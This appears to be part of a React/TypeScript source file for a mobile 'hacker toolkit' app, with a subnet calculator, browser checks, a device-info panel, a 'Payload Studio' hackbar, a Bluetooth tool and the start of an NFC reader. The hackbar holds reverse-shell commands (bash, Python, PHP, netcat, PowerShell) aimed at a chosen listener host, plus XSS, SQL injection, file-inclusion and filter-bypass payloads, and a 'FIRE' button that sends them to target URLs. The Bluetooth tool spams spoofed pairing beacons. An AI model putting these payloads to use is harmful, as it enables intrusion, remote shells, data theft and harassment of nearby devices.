      const toIp = (num: number) => [(num >>> 24) & 255, (num >>> 16) & 255, (num >>> 8) & 255, num & 255].join('.');

      setResult({
        address,
        cidr,
        network: toIp(networkNode),
        broadcast: toIp(broadcastNode),
        hosts: Math.max(0, (2 ** (32 - Number(cidr))) - 2)
      });
    } catch(e) {
      setResult({ error: 'INVALID FORMAT. USE IP/CIDR (E.G. 10.0.0.1/24)' });
    }
  };

  return (
    <CustomToolLayout tool={tool} onClose={onClose}>
      <div className="space-y-6 block">
        <label className="text-gray-500 text-[10px] font-bold uppercase tracking-widest block mb-2">
          IPv4 ADDRESS / CIDR
        </label>
        <div className="flex flex-col sm:flex-row gap-3">
          <ClearableInput
            autoCapitalize="none" autoCorrect="off" autoComplete="off" spellCheck={false}
            type="text"
            value={ip}
            onChange={e => {setIp(e.target.value); setResult(null);}}
            onKeyDown={handleKeyDown}
            className="bg-[#050505] border border-neon-green/20 focus-within:border-neon-green rounded-xl text-xs"
            placeholder="enter network subnet (e.g. 192.168.1.1/24)"
           onClear={() => {setIp(''); setResult(null); }} />
          <button
            onClick={calculate}
            className="shrink-0 px-6 py-4 sm:py-0 border border-neon-green text-black bg-neon-green rounded-xl hover:bg-neon-green/80 transition-all text-xs font-bold uppercase whitespace-nowrap shadow-[0_0_10px_rgba(57,255,20,0.2)] hover:shadow-[0_0_15px_rgba(57,255,20,0.5)]"
          >
            CALCULATE
          </button>
        </div>

        {result && (
          <div className="border border-neon-green/30 rounded-2xl p-5 bg-[#050505] space-y-4">
            <h3 className="text-gray-400 text-[10px] font-bold tracking-widest uppercase">SUBNET DETAILS</h3>
            {result.error ? (
              <div className="text-red-500 text-xs font-bold bg-red-500/10 border border-red-500/20 p-3 rounded-lg">
                {result.error}
              </div>
            ) : (
              <div className="grid grid-cols-2 gap-4">
                 <div className="border border-white/5 rounded-lg p-3 bg-black/40">
                   <p className="text-gray-500 text-[10px] font-bold mb-1">NETWORK</p>
                   <p className="text-neon-green font-bold text-xs">{result.network}</p>
                 </div>
                 <div className="border border-white/5 rounded-lg p-3 bg-black/40">
                   <p className="text-gray-500 text-[10px] font-bold mb-1">BROADCAST</p>
                   <p className="text-neon-green font-bold text-xs">{result.broadcast}</p>
                 </div>
                 <div className="border border-white/5 rounded-lg p-3 bg-black/40 col-span-2">
                   <p className="text-gray-500 text-[10px] font-bold mb-1">USABLE HOSTS</p>
                   <p className="text-white font-bold text-lg">{result.hosts.toLocaleString()}</p>
                 </div>
              </div>
            )}
          </div>
        )}
      </div>
    </CustomToolLayout>
  );
}

// -----------------------------
// Security Check
// -----------------------------
export function SecurityCheckTool({ tool, onClose }: { tool: ToolDef, onClose: () => void }) {
  const [scanning, setScanning] = useState(false);
  const [results, setResults] = useState<{ id: string, name: string, status: 'pass' | 'fail' | 'warn', message: string, fix?: string }[] | null>(null);

  const scan = () => {
    setScanning(true);
    setResults(null);

    setTimeout(() => {
      const checks = [
        {
          id: 'https',
          name: 'HTTPS Encryption',
          status: (window.location.protocol === 'https:' ? 'pass' : 'fail') as 'pass' | 'fail' | 'warn',
          message: window.location.protocol === 'https:' ? 'Connection is secure via HTTPS.' : 'Connecting via unencrypted HTTP.',
          fix: 'Always access sensitive applications over HTTPS. Ensure SSL certificates are properly configured.'
        },
        {
          id: 'cookies',
          name: 'Third-Party Cookies',
          status: (navigator.cookieEnabled ? 'warn' : 'pass') as 'pass' | 'fail' | 'warn',
          message: navigator.cookieEnabled ? 'Browser is accepting cookies.' : 'Cookies are disabled.',
          fix: 'Consider disabling third-party cookies or using strict tracking protection in your browser settings.'
        },
        {
          id: 'do_not_track',
          name: 'Do Not Track (DNT)',
          status: (navigator.doNotTrack === '1' ? 'pass' : 'warn') as 'pass' | 'fail' | 'warn',
          message: navigator.doNotTrack === '1' ? 'DNT header is enabled.' : 'DNT header is missing or disabled.',
          fix: 'Enable the "Do Not Track" request in your browser privacy settings.'
        },
        {
          id: 'plugins',
          name: 'Plugin Exposure',
          status: (navigator.plugins.length > 0 ? 'fail' : 'pass') as 'pass' | 'fail' | 'warn',
          message: `Browser exposes ${navigator.plugins.length} active plugins.`,
          fix: 'Disable unnecessary browser plugins or extensions, as they can be used for fingerprinting.'
        }
      ];
      setResults(checks);
      setScanning(false);
    }, 1500);
  };

  useEffect(() => { scan(); }, []);

  return (
    <CustomToolLayout tool={tool} onClose={onClose}>
      <div className="space-y-6 block">
        <label className="text-gray-500 text-[10px] font-bold uppercase tracking-widest flex items-center justify-between mb-4">
          <span>CLIENT-SIDE VULNERABILITY REPORT</span>
          <button
            onClick={scan}
            disabled={scanning}
            className="bg-neon-green/10 text-neon-green border border-neon-green/30 px-3 py-1 rounded text-[10px] font-bold uppercase tracking-wider disabled:opacity-50 hover:bg-neon-green hover:text-black transition-all"
          >
            {scanning ? 'SCANNING...' : 'RESCAN'}
          </button>
        </label>

        {scanning ? (
           <div className="flex flex-col items-center justify-center p-12 border border-neon-green/20 rounded-xl bg-[#050505]">
             <div className="w-8 h-8 rounded-full border-2 border-neon-green/20 border-t-neon-green animate-spin mb-4" />
             <p className="text-neon-green text-xs font-mono tracking-widest uppercase">EVALUATING SECURITY PROFILE...</p>
           </div>
        ) : results ? (
           <div className="space-y-4">
             {results.map(r => (
               <div key={r.id} className="border border-white/5 bg-[#050505] rounded-xl p-5 relative overflow-hidden">
                 <div className="flex items-start justify-between mb-2">
                   <h3 className="text-white font-bold tracking-widest text-sm uppercase">{r.name}</h3>
                   <span className={`px-2 py-0.5 rounded text-[10px] font-bold uppercase tracking-widest border ${
                     r.status === 'pass' ? 'bg-green-500/10 text-green-400 border-green-500/30' :
                     r.status === 'fail' ? 'bg-red-500/10 text-red-400 border-red-500/30' :
                     'bg-yellow-500/10 text-yellow-400 border-yellow-500/30'
                   }`}>
                     {r.status}
                   </span>
                 </div>
                 <p className="text-gray-400 text-xs font-mono">{r.message}</p>
                 {r.fix && r.status !== 'pass' && (
                   <div className="mt-3 p-3 bg-white/5 border border-white/10 rounded-lg text-gray-300 text-xs leading-relaxed font-mono">
                     <span className="text-yellow-400 font-bold mr-2">RECOMMENDATION:</span>
                     {r.fix}
                   </div>
                 )}
               </div>
             ))}
           </div>
        ) : null}
      </div>
    </CustomToolLayout>
  );
}

// -----------------------------
// Payload Studio (Expanded Hackbar)
// -----------------------------
export function HackbarTool({ tool, onClose }: { tool: ToolDef, onClose: () => void }) {
  const { value: url, setValue: setUrl, handleKeyDown, saveToHistory } = useInputHistory('https://example.com?id=');
  const [activeTab, setActiveTab] = useState<'REVSHELL' | 'XSS' | 'SQLi' | 'LFI' | 'WAF_BYPASS' | 'ENCODER' | 'RESPONSE'>('REVSHELL');
  const [copied, setCopied] = useState(false);
  const [loading, setLoading] = useState(false);
  const [response, setResponse] = useState<{status?: number, data?: string, error?: string} | null>(null);

  // Revshell / LHOST / LPORT logic
  const [lhost, setLhost] = useState('10.10.10.10');
  const [lport, setLport] = useState('4444');

  // Encoder helper state
  const [encoderInput, setEncoderInput] = useState('');
  const [encoderOutput, setEncoderOutput] = useState('');

  const payloads = {
    REVSHELL: [
      { name: 'Bash -i', cmd: `bash -i >& /dev/tcp/${lhost}/${lport} 0>&1` },
      { name: 'Python3', cmd: `python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${lhost}",${lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'` },
      { name: 'PHP Ivan Sincek', cmd: `php -r '$sock=fsockopen("${lhost}",${lport});exec("/bin/sh -i <&3 >&3 2>&3");'` },
      { name: 'Netcat Traditional', cmd: `nc ${lhost} ${lport} -e /bin/bash` },
      { name: 'PowerShell', cmd: `$client = New-Object System.Net.Sockets.TCPClient("${lhost}",${lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()` }
    ],
    XSS: ['<script>alert(1)</script>', '"><img src=x onerror=prompt(1)>', 'javascript:alert(1)//', '<svg/onload=alert(1)>', '\'"-prompt(1)-\'"', '"><details/open/ontoggle=prompt(1)>'],
    SQLi: ["' OR 1=1--", "admin' --", "' UNION SELECT 1,2,3--", "1; DROP TABLE users", "1' ORDER BY 1--+", "' AND (SELECT 1 FROM (SELECT SLEEP(5))A)--"],
    LFI: ['../../../../etc/passwd', 'php://filter/convert.base64-encode/resource=index.php', '/var/www/html/index.php', '....//....//etc/passwd', 'php://filter/read=string.rot13/resource=index.php'],
    WAF_BYPASS: ['<sCrIpt>alert(1)</sCrIpt>', 'SEL%0aECT', '<svg/on+load=alert(1)>', '%3Cscript%3Ealert(1)%3C%2Fscript%3E', '/*!50000SELECT*/ 1']
  };

  const encodePayload = (type: 'url' | 'b64' | 'hex') => {
    try {
      if (type === 'url') setEncoderOutput(encodeURIComponent(encoderInput));
      if (type === 'b64') setEncoderOutput(btoa(encoderInput));
      if (type === 'hex') setEncoderOutput(Array.from(encoderInput).map(c => c.charCodeAt(0).toString(16)).join(''));
    } catch { setEncoderOutput('ENCODE ERROR'); }
  };

  const copyUrl = () => {
    navigator.clipboard.writeText(url);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };

  const executeAttack = async () => {
    if (!url) return;
    (document.activeElement as HTMLElement)?.blur();
    setLoading(true);
    setResponse(null);
    setActiveTab('RESPONSE');

    try {
      const qs = new URLSearchParams({ target: url, method: 'GET' }).toString();
      const backendUrl = getBackendUrl();
      const res = await fetch(`${backendUrl}/api/net/hackbar?${qs}`);
      const data = await res.json();
      setResponse(data);
    } catch (e: any) {
      setResponse({ error: e.message || 'Execution failed' });
    } finally {
      setLoading(false);
    }
  };

  return (
    <CustomToolLayout tool={tool} onClose={onClose}>
      <div className="space-y-4 block h-full flex flex-col">
        <div className="flex flex-col sm:flex-row gap-3">
          <ClearableInput
            autoCapitalize="none" autoCorrect="off" autoComplete="off" spellCheck={false}
            type="text" value={url} onChange={e => setUrl(e.target.value)} onKeyDown={handleKeyDown} onBlur={() => saveToHistory()}
            className="bg-[#050505] border border-neon-green/20 focus-within:border-neon-green rounded-xl text-xs"
            placeholder="target url + param"
           onClear={() => setUrl('')} />
          <div className="flex gap-2 shrink-0">
            <button
              onClick={executeAttack} disabled={loading}
              className={`flex-1 sm:w-28 h-12 rounded-xl text-xs font-bold transition-all ${loading ? 'bg-neon-green/5 text-neon-green/50 border border-neon-green/20' : 'bg-neon-green text-black hover:shadow-[0_0_15px_rgba(57,255,20,0.4)]'}`}
            >
              {loading ? '...' : 'FIRE'}
            </button>
            <button onClick={copyUrl} className="bg-neon-green/10 text-neon-green border border-neon-green/30 w-12 h-12 rounded-xl flex items-center justify-center transition-all">
              {copied ? <Check size={18} /> : <Copy size={18} />}
            </button>
          </div>
        </div>

        {activeTab === 'REVSHELL' && (
           <div className="grid grid-cols-2 gap-4 bg-black/40 p-4 rounded-xl border border-white/5 animate-in fade-in zoom-in-95 duration-200">
             <div className="space-y-1">
               <label className="text-[10px] text-gray-500 font-bold uppercase">LHOST (Your IP)</label>
               <input value={lhost} onChange={e => setLhost(e.target.value)} className="w-full bg-black border border-white/10 rounded-lg p-2 text-xs text-neon-green font-mono" />
             </div>
             <div className="space-y-1">
               <label className="text-[10px] text-gray-500 font-bold uppercase">LPORT</label>
               <input value={lport} onChange={e => setLport(e.target.value)} className="w-full bg-black border border-white/10 rounded-lg p-2 text-xs text-neon-green font-mono" />
             </div>
           </div>
        )}

        <div className="flex gap-2 border-b border-neon-green/20 pb-2 overflow-x-auto scrollbar-none">
          {[...Object.keys(payloads), 'ENCODER', 'RESPONSE'].map(cat => (
            <button
              key={cat} onClick={() => setActiveTab(cat as any)}
              className={`px-3 py-2 font-mono text-[10px] font-bold rounded whitespace-nowrap transition-all ${activeTab === cat ? 'bg-neon-green text-black' : 'text-neon-green hover:bg-neon-green/10'}`}
            >
              {cat}
            </button>
          ))}
        </div>

        <div className="flex-1 overflow-y-auto space-y-2 pb-4 min-h-[300px]">
           {activeTab === 'RESPONSE' ? (
             <div className="bg-[#050505] border border-neon-green/20 p-4 rounded-xl font-mono text-[10px] text-neon-green/80 min-h-[250px] whitespace-pre-wrap break-all overflow-auto">
                {loading ? <span className="animate-pulse">Awaiting response...</span> : response ? (
                  <>
                    {response.error && <div className="text-red-500 mb-2">ERROR: {response.error}</div>}
                    {response.status && <div className="mb-2 text-white border-b border-white/5 pb-2">HTTP {response.status} {(response as any).statusText}</div>}
                    {response.data && <div>{response.data}</div>}
                  </>
                ) : <span className="text-neon-green/30 italic">Target buffer empty.</span>}
             </div>
           ) : activeTab === 'ENCODER' ? (
             <div className="space-y-4 bg-[#050505] border border-neon-green/20 p-4 rounded-xl">
                <textarea
                   value={encoderInput} onChange={e => setEncoderInput(e.target.value)}
                   className="w-full bg-black border border-white/10 rounded-lg p-3 text-xs text-neon-green font-mono h-24 outline-none focus:border-neon-green/50"
                   placeholder="Input payload to encode..."
                />
                <div className="flex flex-wrap gap-2">
                   <button onClick={() => encodePayload('url')} className="px-3 py-1 bg-neon-green/10 border border-neon-green/30 rounded text-[9px] font-bold text-neon-green">URL</button>
                   <button onClick={() => encodePayload('b64')} className="px-3 py-1 bg-neon-green/10 border border-neon-green/30 rounded text-[9px] font-bold text-neon-green">BASE64</button>
                   <button onClick={() => encodePayload('hex')} className="px-3 py-1 bg-neon-green/10 border border-neon-green/30 rounded text-[9px] font-bold text-neon-green">HEX</button>
                </div>
                <div className="border-t border-white/5 pt-4">
                  <div className="text-[9px] text-gray-500 font-bold mb-2 uppercase tracking-widest">Encoded Output:</div>
                  <div className="bg-black/50 p-3 rounded border border-white/5 text-[10px] text-white font-mono break-all min-h-[40px]">
                    {encoderOutput}
                  </div>
                  {encoderOutput && (
                    <button onClick={() => setUrl(prev => prev + encoderOutput)} className="mt-3 w-full py-2 bg-neon-green/20 text-neon-green text-[10px] font-bold rounded uppercase">Append to Target URL</button>
                  )}
                </div>
             </div>
           ) : (
             payloads[activeTab as keyof typeof payloads].map((p, i) => {
               const pContent = typeof p === 'string' ? p : p.cmd;
               const pName = typeof p === 'string' ? null : p.name;

               return (
                 <div key={i} className="flex flex-col gap-3 bg-[#050505] border border-neon-green/10 p-3 rounded-lg hover:border-neon-green/30 transition-all group">
                    {pName && <div className="text-[9px] text-gray-500 font-bold uppercase tracking-widest">{pName}</div>}
                    <code className="text-neon-green/80 text-[10px] break-all font-mono leading-relaxed">{pContent}</code>
                    <div className="flex gap-2">
                      <button onClick={() => setUrl(prev => prev + pContent)} className="flex-1 bg-neon-green/5 text-neon-green border border-neon-green/20 py-1.5 rounded text-[9px] font-bold uppercase transition-all hover:bg-neon-green hover:text-black">Append</button>
                      <button onClick={() => setUrl(prev => prev + encodeURIComponent(pContent))} className="flex-1 bg-neon-green/5 text-neon-green border border-neon-green/20 py-1.5 rounded text-[9px] font-bold uppercase transition-all hover:bg-neon-green hover:text-black">URL Encode</button>
                      <button
                        onClick={() => { setUrl(prev => prev + pContent); setTimeout(() => executeAttack(), 100); }}
                        className="flex-1 bg-neon-green text-black py-1.5 rounded text-[9px] font-black uppercase transition-all hover:bg-white"
                      >
                        Fire
                      </button>
                    </div>
                 </div>
               );
             })
           )}
        </div>
      </div>
    </CustomToolLayout>
  );
}

export function DeviceInfoTool({ tool, onClose }: { tool: ToolDef, onClose: () => void }) {
  const [scanning, setScanning] = useState(false);
  const [results, setResults] = useState<any[] | null>(null);

  const scan = async () => {
    setScanning(true);

    // Simulate a bit of "interrogation" delay for effect
    await new Promise(r => setTimeout(r, 800));

    const info = [
      { label: 'OS / Platform', value: `${Capacitor.getPlatform().toUpperCase()} (${navigator.platform})` },
      { label: 'Native Runtime', value: Capacitor.isNativePlatform() ? 'CAPACITOR NATIVE' : 'WEB BROWSER' },
      { label: 'User Agent', value: navigator.userAgent },
      { label: 'Language', value: navigator.language },
      { label: 'Screen Resolution', value: `${window.screen.width}x${window.screen.height} (@${window.devicePixelRatio}x)` },
      { label: 'CPU Cores', value: `${navigator.hardwareConcurrency || 'Unknown'} Cores` },
      { label: 'RAM Estimate', value: (navigator as any).deviceMemory ? `${(navigator as any).deviceMemory} GB` : 'Restricted' },
      { label: 'Network Connection', value: navigator.onLine ? 'ONLINE' : 'OFFLINE' },
      { label: 'CORS Capability', value: 'ENABLED' },
      { label: 'Web Crypto API', value: window.crypto ? 'SECURE' : 'UNAVAILABLE' }
    ];

    setResults(info);
    setScanning(false);
  };

  useEffect(() => { scan(); }, []);

  return (
    <CustomToolLayout tool={tool} onClose={onClose}>
      <div className="space-y-6 block">
        <label className="text-gray-500 text-[10px] font-bold uppercase tracking-widest flex items-center justify-between mb-4">
          <span>LOCAL SYSTEM CAPABILITIES</span>
          <button
            onClick={scan}
            disabled={scanning}
            className="bg-neon-green/10 text-neon-green border border-neon-green/30 px-3 py-1 rounded text-[10px] font-bold uppercase tracking-wider disabled:opacity-50 hover:bg-neon-green hover:text-black transition-all"
          >
            {scanning ? 'SCANNING...' : 'RESCAN'}
          </button>
        </label>

        {scanning ? (
           <div className="flex flex-col items-center justify-center p-12 border border-neon-green/20 rounded-xl bg-[#050505]">
             <div className="w-8 h-8 rounded-full border-2 border-neon-green/20 border-t-neon-green animate-spin mb-4" />
             <p className="text-neon-green text-xs font-mono tracking-widest uppercase">INTERROGATING HARDWARE...</p>
           </div>
        ) : results ? (
           <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
             {results.map((r, i) => (
               <div key={i} className="border border-white/5 bg-[#050505] rounded-xl p-4 flex flex-col justify-center overflow-hidden hover:border-neon-green/20 transition-all group">
                 <span className="text-gray-500 text-[10px] font-bold uppercase tracking-widest mb-1 truncate group-hover:text-neon-green/50 transition-colors">{r.label}</span>
                 <span className="text-neon-green text-xs font-mono break-words">{r.value}</span>
               </div>
             ))}
             <div className="sm:col-span-2 p-3 bg-neon-green/5 border border-neon-green/20 rounded-lg text-center">
                <p className="text-[10px] text-gray-500 font-mono uppercase italic">Unique Fingerprint: {btoa(navigator.userAgent).substring(0, 16)}...</p>
             </div>
           </div>
        ) : null}
      </div>
    </CustomToolLayout>
  );
}

// Global BLE state to prevent multiple initializations
let globalBleInitialized = false;

function BluetoothTool({ tool, onClose }: { tool: ToolDef, onClose: () => void }) {
  const [scanning, setScanning] = useState(false);
  const [message, setMessage] = useState<string>('');
  const [devices, setDevices] = useState<any[]>([]);
  const [activeTab, setActiveTab] = useState<'scanner' | 'beacon'>('scanner');
  const [spamming, setSpamming] = useState(false);
  const hardwareLocked = useRef(false);

  useEffect(() => {
    return () => {
      // Safe exit cleanup
      if (Capacitor.isNativePlatform()) {
        BleClient.stopLEScan().catch(() => {});
        BleClient.stopAdvertising().catch(() => {});
      }
    };
  }, []);

  const ensureBleEnabled = async () => {
    try {
      if (!globalBleInitialized) {
        await BleClient.initialize();
        globalBleInitialized = true;
      }
      // On Android we might need to check and request enable
      if (Capacitor.getPlatform() === 'android') {
        // Request permissions first on modern Android
        try {
            await BleClient.requestPermissions();
        } catch (e) {
            console.warn('Permission request failed or already granted');
        }

        const enabled = await BleClient.isEnabled();
        if (!enabled) {
          try {
            await BleClient.enable();
          } catch (e) {
            // User might have denied, but we try to proceed or show message
            throw new Error('Bluetooth must be enabled to use this tool.');
          }
        }
      }
    } catch (e: any) {
      console.error('BLE INIT FAIL', e);
      throw new Error(e.message || 'Bluetooth Hardware Busy');
    }
  };

  const killActive = async () => {
    if (!Capacitor.isNativePlatform()) return true;
    if (hardwareLocked.current) return false;
    hardwareLocked.current = true;

    setMessage('Purging Radio State...');
    try {
      await BleClient.stopLEScan().catch(() => {});
      await new Promise(r => setTimeout(r, 600));
      await BleClient.stopAdvertising().catch(() => {});
    } catch(e) {}

    setScanning(false);
    setSpamming(false);

    // Physical chip stabilization delay - Vital for Android 13+
    await new Promise(r => setTimeout(r, 2500));
    hardwareLocked.current = false;
    return true;
  };

  const startScan = async () => {
    (document.activeElement as HTMLElement)?.blur();
    try {
      if (Capacitor.isNativePlatform()) {
        const ready = await killActive();
        if (!ready) {
          setMessage('Hardware Lock Active. Wait...');
          return;
        }

        await ensureBleEnabled();
        setScanning(true);
        setMessage('Sniffing Packets...');

        await BleClient.requestLEScan({
          allowDuplicates: false
        }, (result) => {
          setDevices(prev => {
            const exists = prev.find(d => d.id === result.device.deviceId);
            if (exists) {
              return prev.map(d => d.id === result.device.deviceId ? { ...d, rssi: result.rssi } : d);
            }
            return [...prev, {
              id: result.device.deviceId,
              name: result.device.name || result.localName || 'Unknown Device',
              rssi: result.rssi,
              raw: result
            }];
          });
        });

        setTimeout(async () => {
          await BleClient.stopLEScan().catch(() => {});
          setScanning(false);
          setMessage('Scan complete.');
        }, 15000);
      } else {
        if (!('bluetooth' in navigator)) {
          setMessage('Web BT Link Fail.');
          setScanning(false);
          return;
        }
        setScanning(true);
        const device = await (navigator as any).bluetooth.requestDevice({ acceptAllDevices: true });
        setDevices(prev => [...prev, { id: device.id, name: device.name || 'Unknown', rssi: 'N/A' }]);
        setScanning(false);
      }
    } catch (error: any) {
      console.error('BLE SCAN FAIL', error);
      setMessage('Hardware Fault. Restart BT.');
      setScanning(false);
    }
  };

  const startSpamBeacon = async (type: 'apple' | 'google' | 'samsung') => {
    if (!Capacitor.isNativePlatform()) {
      setMessage('Requires Native HW.');
      return;
    }
    try {
      const ready = await killActive();
      if (!ready) {
        setMessage('Radio Busy. Wait...');
        return;
      }

      setSpamming(true);
      setMessage(`Locking Radio: ${type.toUpperCase()}...`);

      await ensureBleEnabled();

      // Physical chip stabilization - critical for Android BLE stack
      await new Promise(r => setTimeout(r, 1800));

      let mId = 0x004c; // Apple
      // Format: [Type, Length, Data...]
      // Type 0x07 (Proximity), Length 0x05, 0x01 (Status), 0x00, 0x20, 0x02, 0x00
      let mData: number[] = [0x07, 0x05, 0x01, 0x00, 0x20, 0x02, 0x00];
      let services: string[] = [];

      if (type === 'google') {
        mId = 0x00e0;
        mData = [0x00, 0x03, 0x00, 0x01, 0x02];
        services = ["FE2C"];
      } else if (type === 'samsung') {
        mId = 0x0075;
        // Samsung Pairing: [0x01, 0x00, 0x02, ...]
        mData = [0x01, 0x00, 0x02, 0x00, 0x01, 0x01, 0xFF];
      }

      try {
        const payload: any = {
          manufacturerId: mId,
          manufacturerData: mData,
          includeDeviceName: false
        };

        if (services.length > 0) payload.services = services;
        if (Capacitor.getPlatform() === 'android') payload.name = "";

        await BleClient.startAdvertising(payload);
        setMessage(`BROADCAST ACTIVE: ${type.toUpperCase()}`);
      } catch (inner: any) {
        console.error('BLE ADVERTISE FAIL', inner);
        setMessage(`DRIVER REJECT: ${inner.message || 'HW Busy'}. Cycle BT.`);
        setSpamming(false);
      }
    } catch (error: any) {
      console.error('BLE SPAM FAIL', error);
      setMessage('Hardware Fault. Retry.');
      setSpamming(false);
    }
  };

  const stopSpam = async () => {
    try {
      await BleClient.stopAdvertising();
      setSpamming(false);
      setMessage('Beacon broadcast terminated.');
    } catch(e) {}
  };

  return (
    <CustomToolLayout tool={tool} onClose={onClose}>
      <div className="flex flex-col h-full space-y-4">
        <div className="flex gap-2 border-b border-neon-green/20 pb-2">
           <button onClick={() => setActiveTab('scanner')} className={`flex-1 py-2 text-[10px] font-bold tracking-widest uppercase transition-all ${activeTab === 'scanner' ? 'text-neon-green bg-neon-green/10 rounded' : 'text-gray-500'}`}>SCANNER</button>
           <button onClick={() => setActiveTab('beacon')} className={`flex-1 py-2 text-[10px] font-bold tracking-widest uppercase transition-all ${activeTab === 'beacon' ? 'text-neon-green bg-neon-green/10 rounded' : 'text-gray-500'}`}>BEACON SPAM</button>
        </div>

        {activeTab === 'scanner' ? (
          <>
            <div className="flex flex-col items-center justify-center border border-neon-green/20 bg-neon-green/5 rounded-2xl p-8 flex-1 min-h-[250px] text-center">
              <div className={`w-20 h-20 rounded-full border-2 ${scanning ? 'border-neon-green animate-pulse shadow-[0_0_15px_rgba(57,255,20,0.3)]' : 'border-neon-green/30'} flex items-center justify-center mb-6`}>
                 <span className="text-3xl text-neon-green font-bold">BT</span>
              </div>
              <p className="text-[10px] text-gray-400 font-mono mb-8 max-w-xs leading-relaxed uppercase tracking-tighter">
                {message || 'Ready for 2026 BLE packet sniffing/scan sequences.'}
              </p>
              <button onClick={startScan} disabled={scanning} className="bg-neon-green text-black hover:bg-white transition-all px-8 py-3 w-full sm:w-auto rounded-xl font-bold uppercase tracking-widest text-[10px] disabled:opacity-50 shadow-lg">
                 {scanning ? 'SCANNING AIRWAVES...' : 'INITIALIZE SCAN'}
              </button>
            </div>

            {devices.length > 0 && (
               <div className="bg-[#050505] rounded-xl border border-neon-green/20 p-4 space-y-3 overflow-auto max-h-[300px]">
                 <h3 className="text-[10px] font-bold text-gray-500 tracking-widest uppercase">Nodes Detected ({devices.length})</h3>
                 {devices.sort((a,b) => (b.rssi === 'N/A' ? -100 : b.rssi) - (a.rssi === 'N/A' ? -100 : a.rssi)).map((d, i) => (
                    <div key={i} className="flex justify-between items-center border-b border-white/5 pb-2 last:border-0 hover:bg-neon-green/5 p-2 rounded transition-colors group">
                      <div className="flex flex-col min-w-0">
                        <span className="text-neon-green font-bold text-xs truncate">{d.name}</span>
                        <span className="text-gray-500 text-[9px] font-mono uppercase tracking-widest">{d.id}</span>
                        {d.raw?.manufacturerData && (
                          <span className="text-blue-400 text-[8px] font-mono mt-1">MFG: {Object.keys(d.raw.manufacturerData).join(', ')}</span>
                        )}
                      </div>
                      <div className="flex flex-col items-end shrink-0 ml-4">
                        <span className="text-gray-500 text-[8px] font-mono uppercase">Signal Strength</span>
                        <span className={`text-[10px] font-bold ${d.rssi > -60 ? 'text-green-400' : d.rssi > -80 ? 'text-yellow-400' : 'text-red-400'}`}>
                          {d.rssi} dBm
                        </span>
                      </div>
                    </div>
                 ))}
               </div>
            )}
          </>
        ) : (
          <div className="space-y-6">
            <div className="p-4 border border-neon-green/20 bg-neon-green/5 rounded-xl">
               <p className="text-[10px] text-gray-400 font-mono uppercase leading-relaxed text-center">
                 BLE Advertising allows spoofing proximity packets for various devices.
                 <br/><span className="text-neon-green">Warning: Use for educational security research only.</span>
               </p>
            </div>

            <div className="grid grid-cols-1 gap-3">
              {[
                { id: 'apple', name: 'APPLE PROXIMITY (AIRPODS)', color: 'bg-white text-black' },
                { id: 'google', name: 'GOOGLE FAST PAIR', color: 'bg-blue-500 text-white' },
                { id: 'samsung', name: 'SAMSUNG SMARTTHINGS', color: 'bg-purple-500 text-white' }
              ].map(b => (
                <button
                  key={b.id}
                  onClick={() => spamming ? stopSpam() : startSpamBeacon(b.id as any)}
                  className={`w-full py-4 rounded-xl font-bold uppercase tracking-widest text-[10px] transition-all border ${spamming && message.includes(b.id.toUpperCase()) ? 'bg-red-500 border-red-500 animate-pulse text-white' : `${b.color} border-transparent hover:opacity-90 active:scale-[0.98]`}`}
                  disabled={spamming && !message.includes(b.id.toUpperCase())}
                >
                  {spamming && message.includes(b.id.toUpperCase()) ? `STOPPING ${b.id.toUpperCase()} SPAM...` : `EXECUTE ${b.name}`}
                </button>
              ))}
            </div>

            {message && (
              <div className="p-3 bg-black border border-neon-green/20 rounded-lg text-center">
                <span className="text-neon-green font-mono text-[9px] uppercase tracking-widest">{message}</span>
              </div>
            )}
          </div>
        )}
      </div>
    </CustomToolLayout>
  );
}

function NfcTool({ tool, onClose }: { tool: ToolDef, onClose: () => void }) {
  const [scanning, setScanning] = useState(false);
  const [message, setMessage] = useState<string>('');
  const [records, setRecords] = useState<any[]>([]);
  const [activeTab, setActiveTab] = useState<'read' | 'write'>('read');

  // Write state
  const [writeType, setWriteTab] = useState<'text' | 'uri'>('text');
  const [writePayload, setWritePayload] = useState('');
  const [writing, setWriting] = useState(false);

  useEffect(() => {
    return () => {
      if (Capacitor.isNativePlatform()) {
        CapacitorNfc.stopScanning().catch(() => {});
      }
    };
  }, []);

  const startScan = async () => {
    (document.activeElement as HTMLElement)?.blur();
    try {
      if (Capacitor.isNativePlatform()) {
        const status = await CapacitorNfc.checkPermissions();
        if (status.nfc !== 'granted') {
           const req = await CapacitorNfc.requestPermissions();
           if (req.nfc !== 'granted') {
              setMessage('NFC Permission Denied.');
              return;
           }
        }

        setScanning(true);
        setMessage('Ready. Bring NFC tag near the device antenna...');

        await CapacitorNfc.addListener('nfcEvent', async (event) => {
          setMessage(`Scanned Tag! Serial: ${event.tag.id || 'Unknown'}`);
          const decoded = [];
          if (event.tag.ndefMessage) {
            for (const record of event.tag.ndefMessage) {
               decoded.push({
                 type: record.type ? String.fromCharCode(...record.type) : 'Unknown',
                 data: record.payload ? String.fromCharCode(...record.payload) : '<binary>'
               });
            }
          } else {
             decoded.push({ type: 'Info', data: 'Tag has no NDEF records or is empty.' });
          }
          setRecords(decoded);
          setScanning(false);
          await CapacitorNfc.stopScanning();
        });

        await CapacitorNfc.startScanning();
      } else {
        if (!('NDEFReader' in window)) {
          setMessage('NFC not supported by browser.');
          setScanning(false);
          return;
        }
        setScanning(true);
        setMessage('Please bring an NFC tag near the device...');
        const ndef = new (window as any).NDEFReader();
        await ndef.scan();
        ndef.addEventListener("reading", ({ message, serialNumber }: any) => {
          setMessage(`Read tag: ${serialNumber}`);
          const decodedRecords = message.records.map((r: any) => ({ type: r.recordType, data: new TextDecoder().decode(r.data) }));
          setRecords(decodedRecords);
          setScanning(false);
        });
      }
    } catch (error: any) {
